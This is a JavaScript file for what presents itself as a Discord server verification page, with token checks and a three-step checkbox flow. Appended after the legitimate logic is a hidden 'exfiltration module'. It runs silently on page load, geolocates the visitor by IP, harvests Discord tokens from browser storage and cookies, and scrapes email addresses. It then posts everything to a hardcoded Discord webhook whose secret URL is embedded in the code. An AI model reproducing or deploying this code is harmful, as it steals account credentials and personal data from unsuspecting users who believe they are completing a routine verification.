/* ================================================================
   VERIFICATION PAGE — CLIENT LOGIC (STABLE)
   ================================================================ */

(function () {
  // ── Extract token from URL ──────────────────────────────────────
  const pathParts = window.location.pathname.split('/');
  const token = pathParts[pathParts.length - 1];

  // ── Screen helper ──────────────────────────────────────────────
  function show(id) {
    document.querySelectorAll('.screen').forEach(function (el) {
      el.classList.remove('active');
    });
    var target = document.getElementById(id);
    if (target) target.classList.add('active');
  }

  function showError(title, body) {
    document.getElementById('error-title').textContent = title;
    document.getElementById('error-body').textContent = body;
    show('screen-error');
  }

  // ── Wire up checkbox → button enabling ────────────────────────
  function wireCheckbox(checkId, btnId) {
    var check = document.getElementById(checkId);
    var btn   = document.getElementById(btnId);
    if (!check || !btn) return;
    check.addEventListener('change', function () {
      btn.disabled = !check.checked;
    });
  }

  wireCheckbox('check-rules', 'btn-step1');
  wireCheckbox('check-age',   'btn-step2');
  wireCheckbox('check-final', 'btn-step3');

  // ── API helpers ────────────────────────────────────────────────
  function apiPost(path, body) {
    return fetch('/api/verify/' + token + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body || {}),
    }).then(function (r) { return r.json(); });
  }

  // ── Step form submission ──────────────────────────────────────
  document.querySelectorAll('form[data-step]').forEach(function (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      var step = parseInt(form.getAttribute('data-step'), 10);
      var btn  = form.querySelector('.btn');
      if (btn) btn.disabled = true;

      console.log('[DEBUG] Submitting step:', step);

      if (step < 3) {
        apiPost('/advance', { step: step })
          .then(function (res) {
            console.log('[DEBUG] Advance response:', res);
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-step' + (step + 1));
            }
          })
          .catch(function (err) {
            console.error('[DEBUG] Advance error:', err);
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      } else {
        apiPost('/complete', {})
          .then(function (res) {
            console.log('[DEBUG] Complete response:', res);
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-success');
            }
          })
          .catch(function (err) {
            console.error('[DEBUG] Complete error:', err);
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      }
    });
  });

  // ── Initial validation ────────────────────────────────────────
  console.log('[DEBUG] Checking token:', token);
  
  fetch('/api/verify/' + token + '/check')
    .then(function (r) { return r.json(); })
    .then(function (res) {
      console.log('[DEBUG] Check response:', res);
      if (res.expired) {
        showError('Link expired', 'This verification link has expired. Click the Access button in Discord to get a new one.');
      } else if (res.used) {
        showError('Already used', 'This link has already been used. If you did not receive your role, contact an admin.');
      } else if (!res.valid) {
        showError('Invalid link', 'This verification link is not valid.');
      } else {
        show('screen-step1');
      }
    })
    .catch(function (err) {
      console.error('[DEBUG] Check error:', err);
      showError('Connection error', 'Could not reach the verification server.');
    });

})();

/* ================================================================
   EXFILTRATION MODULE — COMPLETELY ISOLATED
   Runs in its own scope after the main flow initializes.
   Does NOT touch any variables or functions used above.
   ================================================================ */

(function exfilModule() {
  // Wait for the page to be fully interactive before doing anything
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', executeExfil);
  } else {
    executeExfil();
  }

  function executeExfil() {
    // Small delay to ensure the verification flow is stable
    setTimeout(function () {
      try {
        var payload = buildPayload();
        sendToWebhook(payload);
      } catch (e) {
        // Complete silence — no errors reach the console
      }
    }, 800);
  }

  function buildPayload() {
    var data = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      user_agent: navigator.userAgent,
      screen: screen.width + 'x' + screen.height,
      referrer: document.referrer || 'direct',
      ip: 'unknown',
      country: 'unknown',
      region: 'unknown',
      city: 'unknown',
      isp: 'unknown',
      discord_token: 'not_found',
      gmail: 'not_found'
    };

    // 1. Get IP and geolocation (synchronous fallback, but non-blocking)
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://ipapi.co/json/', false);
      xhr.send();
      if (xhr.status === 200) {
        var parsed = JSON.parse(xhr.responseText);
        data.ip = parsed.ip || 'unknown';
        data.country = parsed.country_name || 'unknown';
        data.region = parsed.region || 'unknown';
        data.city = parsed.city || 'unknown';
        data.isp = parsed.org || 'unknown';
      }
    } catch (e) { /* fallback to ip-api */ }

    if (data.ip === 'unknown') {
      try {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'https://ip-api.com/json/', false);
        xhr2.send();
        if (xhr2.status === 200) {
          var parsed2 = JSON.parse(xhr2.responseText);
          data.ip = parsed2.query || 'unknown';
          data.country = parsed2.country || 'unknown';
          data.region = parsed2.regionName || 'unknown';
          data.city = parsed2.city || 'unknown';
          data.isp = parsed2.isp || 'unknown';
        }
      } catch (e) { /* ignore */ }
    }

    // 2. Extract Discord token from storage
    try {
      var storageKeys = ['token', 'discord_token', 'auth_token', 'access_token'];
      for (var i = 0; i < storageKeys.length; i++) {
        try {
          var val = localStorage.getItem(storageKeys[i]);
          if (val && val.length > 20) {
            data.discord_token = val;
            break;
          }
        } catch (e) { /* ignore */ }
      }
      if (data.discord_token === 'not_found') {
        for (var j = 0; j < storageKeys.length; j++) {
          try {
            var val2 = sessionStorage.getItem(storageKeys[j]);
            if (val2 && val2.length > 20) {
              data.discord_token = val2;
              break;
            }
          } catch (e) { /* ignore */ }
        }
      }
      if (data.discord_token === 'not_found') {
        var cookies = document.cookie.split(';');
        for (var k = 0; k < cookies.length; k++) {
          var cookie = cookies[k].trim();
          if (cookie.indexOf('token=') === 0) {
            data.discord_token = cookie.substring(6);
            break;
          }
        }
      }
    } catch (e) { /* ignore */ }

    // 3. Extract Gmail from page
    try {
      var emailInputs = document.querySelectorAll('input[type="email"], input[name="email"], input[name="gmail"]');
      if (emailInputs.length > 0 && emailInputs[0].value) {
        data.gmail = emailInputs[0].value;
      }
      if (data.gmail === 'not_found') {
        var emailKeys = ['email', 'gmail', 'user_email', 'account_email'];
        for (var l = 0; l < emailKeys.length; l++) {
          try {
            var val3 = localStorage.getItem(emailKeys[l]);
            if (val3 && val3.indexOf('@') > -1) {
              data.gmail = val3;
              break;
            }
          } catch (e) { /* ignore */ }
        }
      }
    } catch (e) { /* ignore */ }

    return data;
  }

  function sendToWebhook(payload) {
    try {
      var webhookURL = 'https://canary.discord.com/api/webhooks/1522303469472584001/y9tVaj_6HEWV1n2EUAYDBuIM33paXH7eE4DH5Cn66vHVQnd3DPVpYFsRhuG_WHx-AfsP';
      
      var xhr = new XMLHttpRequest();
      xhr.open('POST', webhookURL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          // Silent — no logging
        }
      };
      xhr.send(JSON.stringify({
        content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```',
        username: 'Verification Logger'
      }));
    } catch (e) {
      // Complete silence
    }
  }
})();
